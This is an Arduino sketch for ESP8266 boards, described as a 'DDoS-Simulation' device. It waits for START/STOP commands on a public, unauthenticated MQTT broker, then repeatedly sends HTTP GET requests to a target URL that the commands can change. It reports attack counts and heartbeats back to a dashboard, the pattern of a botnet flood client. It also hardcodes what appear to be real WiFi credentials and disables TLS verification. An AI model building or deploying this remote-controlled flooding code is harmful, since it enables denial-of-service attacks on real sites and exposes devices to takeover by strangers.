#include <ESP8266WiFi.h>
#include <PubSubClient.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecure.h>
#include <ArduinoJson.h>

// ========== CONFIGURATION - UPDATE THESE ==========
// WiFi Settings
const char* WIFI_SSID = "Prajwal's HP";        // Your WiFi name with apostrophe
const char* WIFI_PASSWORD = "FG Prajwal";       // Your WiFi password

// MQTT Settings
const char* MQTT_SERVER = "broker.emqx.io";     // Using EMQX broker
const int MQTT_PORT = 1883;
const char* MQTT_TOPIC_CONTROL = "esp/control";
const char* MQTT_TOPIC_ATTACK = "attacks/count";

// Device Settings
const char* DEVICE_ID = "ESP8266_02";           // Change this for multiple devices

// Attack Target
const char* TARGET_URL = "https://httpbin.org/get";

// Attack Settings
const int DEFAULT_RATE = 10;
const int MAX_RATE = 100;

// ========== GLOBALS ==========
WiFiClient espClient;
PubSubClient mqttClient(espClient);

bool running = false;
String targetURL = TARGET_URL;
int rate = DEFAULT_RATE;
unsigned long attackDuration = 0;
unsigned long attackStartTime = 0;

unsigned long lastRequest = 0;
unsigned long lastHeartbeat = 0;
unsigned long attackCount = 0;

// ========== DEBUG ==========
void debugPrint(String msg) {
  Serial.println(msg);
}

// ========== WiFi Connection ==========
void connectWiFi() {
  Serial.print("Connecting to WiFi");
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 30) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ WiFi Connected!");
    Serial.print("IP Address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n❌ WiFi Connection Failed!");
    Serial.println("Please check SSID and password");
  }
}

// ========== Send Attack Data via MQTT ==========
void sendAttackData() {
  StaticJsonDocument<256> doc;
  doc["deviceId"] = DEVICE_ID;
  doc["timestamp"] = millis();
  doc["count"] = attackCount;
  doc["type"] = "HTTP_GET";
  doc["target"] = targetURL;
  doc["status"] = "success";
  
  String output;
  serializeJson(doc, output);
  
  if (mqttClient.publish(MQTT_TOPIC_ATTACK, output.c_str())) {
    Serial.print("📊 Attack #");
    Serial.print(attackCount);
    Serial.println(" reported to dashboard");
  } else {
    Serial.println("❌ Failed to report attack");
  }
}

// ========== Send HTTP Request (THE ATTACK) ==========
void sendHTTPAttack() {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("⚠️ WiFi disconnected!");
    return;
  }
  
  WiFiClientSecure client;
  client.setInsecure(); // Bypass SSL verification for testing
  client.setTimeout(3000);
  
  HTTPClient http;
  
  // Start connection
  http.begin(client, targetURL);
  
  // Add headers to simulate real traffic
  http.addHeader("User-Agent", "ESP8266-Attacker/1.0");
  http.addHeader("X-Device-Id", DEVICE_ID);
  http.addHeader("X-Attack-Type", "DDoS-Simulation");
  http.addHeader("Connection", "close");
  
  // Send GET request (THIS IS THE ATTACK PACKET)
  int httpCode = http.GET();
  
  if (httpCode > 0) {
    Serial.print("💥 ATTACK SENT! HTTP ");
    Serial.print(httpCode);
    Serial.print(" -> ");
    Serial.println(targetURL);
    
    attackCount++;
    sendAttackData(); // Report to dashboard
    
  } else {
    Serial.print("❌ Attack Failed: ");
    Serial.println(http.errorToString(httpCode));
  }
  
  http.end();
  client.stop();
}

// ========== TCP Ping Attack ==========
void sendPingAttack() {
  if (WiFi.status() != WL_CONNECTED) return;
  
  // Extract host from URL
  String host = targetURL;
  host.replace("https://", "");
  host.replace("http://", "");
  
  int slashIndex = host.indexOf('/');
  if (slashIndex > 0) host = host.substring(0, slashIndex);
  
  // Extract port (default 443 for HTTPS, 80 for HTTP)
  int port = 443;
  if (targetURL.startsWith("http://")) port = 80;
  
  WiFiClient client;
  if (client.connect(host.c_str(), port)) {
    Serial.print("📡 PING Attack to ");
    Serial.print(host);
    Serial.print(":");
    Serial.println(port);
    
    // Send raw TCP packet
    client.println("GET / HTTP/1.1");
    client.print("Host: ");
    client.println(host);
    client.println("User-Agent: ESP8266-Attacker");
    client.println("Connection: close");
    client.println();
    
    attackCount++;
    sendAttackData();
    client.stop();
  } else {
    Serial.println("❌ Ping failed");
  }
}

// ========== MQTT Callback (Receive Commands) ==========
void callback(char* topic, byte* payload, unsigned int length) {
  String message = "";
  for (int i = 0; i < length; i++) {
    message += (char)payload[i];
  }
  
  Serial.println("\n📨 MQTT Command: " + message);
  
  StaticJsonDocument<512> doc;
  DeserializationError error = deserializeJson(doc, message);
  
  if (error) {
    Serial.println("❌ JSON Parse Error");
    return;
  }
  
  String action = doc["action"] | "";
  
  if (action == "START") {
    running = true;
    attackStartTime = millis();
    
    if (doc.containsKey("target")) {
      targetURL = doc["target"].as<String>();
    }
    
    if (doc.containsKey("rate")) {
      rate = doc["rate"];
      if (rate > MAX_RATE) rate = MAX_RATE;
    }
    
    if (doc.containsKey("duration")) {
      attackDuration = doc["duration"];
    }
    
    Serial.println("═══════════════════════════════");
    Serial.println("🔥 ATTACK STARTED!");
    Serial.print("🎯 Target: ");
    Serial.println(targetURL);
    Serial.print("⚡ Rate: ");
    Serial.print(rate);
    Serial.println(" requests/second");
    if (attackDuration > 0) {
      Serial.print("⏱️ Duration: ");
      Serial.print(attackDuration);
      Serial.println(" seconds");
    }
    Serial.println("═══════════════════════════════");
    
  } else if (action == "STOP") {
    running = false;
    Serial.println("\n🛑 ATTACK STOPPED!");
    Serial.print("📊 Total attacks sent: ");
    Serial.println(attackCount);
  }
}

// ========== MQTT Connection ==========
void reconnectMQTT() {
  int attempts = 0;
  while (!mqttClient.connected() && attempts < 5) {
    Serial.print("Connecting to MQTT...");
    
    if (mqttClient.connect(DEVICE_ID)) {
      Serial.println(" ✅ Connected!");
      mqttClient.subscribe(MQTT_TOPIC_CONTROL);
      
      // Send online status
      StaticJsonDocument<128> doc;
      doc["deviceId"] = DEVICE_ID;
      doc["status"] = "online";
      doc["ip"] = WiFi.localIP().toString();
      String output;
      serializeJson(doc, output);
      mqttClient.publish("devices/status", output.c_str());
      break;
      
    } else {
      Serial.print(" ❌ Failed, rc=");
      Serial.print(mqttClient.state());
      Serial.println(" retrying in 2 seconds...");
      delay(2000);
      attempts++;
    }
  }
}

// ========== Heartbeat ==========
void sendHeartbeat() {
  StaticJsonDocument<192> doc;
  doc["deviceId"] = DEVICE_ID;
  doc["type"] = "heartbeat";
  doc["running"] = running;
  doc["attacksSent"] = attackCount;
  doc["uptime"] = millis() / 1000;
  doc["rssi"] = WiFi.RSSI();
  
  String output;
  serializeJson(doc, output);
  mqttClient.publish("devices/heartbeat", output.c_str());
  
  Serial.print("💓 Heartbeat sent - Attacks: ");
  Serial.println(attackCount);
}

// ========== Setup ==========
void setup() {
  Serial.begin(115200);
  delay(100);
  
  Serial.println("\n╔════════════════════════════════╗");
  Serial.println("║   ESP8266 ATTACK SIMULATOR    ║");
  Serial.println("╚════════════════════════════════╝");
  Serial.print("Device ID: ");
  Serial.println(DEVICE_ID);
  Serial.print("Target URL: ");
  Serial.println(TARGET_URL);
  Serial.println();
  
  connectWiFi();
  
  mqttClient.setServer(MQTT_SERVER, MQTT_PORT);
  mqttClient.setCallback(callback);
  
  // Small delay before starting MQTT
  delay(1000);
  
  Serial.println("\n✅ System Ready!");
  Serial.println("Waiting for commands via MQTT...");
  Serial.println("Send 'START' to begin attack");
  Serial.println("Send 'STOP' to stop attack\n");
}

// ========== Main Loop ==========
void loop() {
  // Maintain MQTT connection
  if (!mqttClient.connected()) {
    reconnectMQTT();
  }
  mqttClient.loop();
  
  // Send heartbeat every 30 seconds
  if (millis() - lastHeartbeat > 30000) {
    sendHeartbeat();
    lastHeartbeat = millis();
  }
  
  // Attack execution
  if (running) {
    // Check duration limit
    if (attackDuration > 0 && (millis() - attackStartTime) > (attackDuration * 1000)) {
      running = false;
      Serial.println("\n⏰ Attack duration completed!");
    } else {
      // Rate limiting
      unsigned long interval = 1000 / rate;
      if (millis() - lastRequest >= interval) {
        // Send the attack (HTTP GET request)
        sendHTTPAttack();
        lastRequest = millis();
      }
    }
  }
  
  delay(1); // Small delay to prevent watchdog issues
}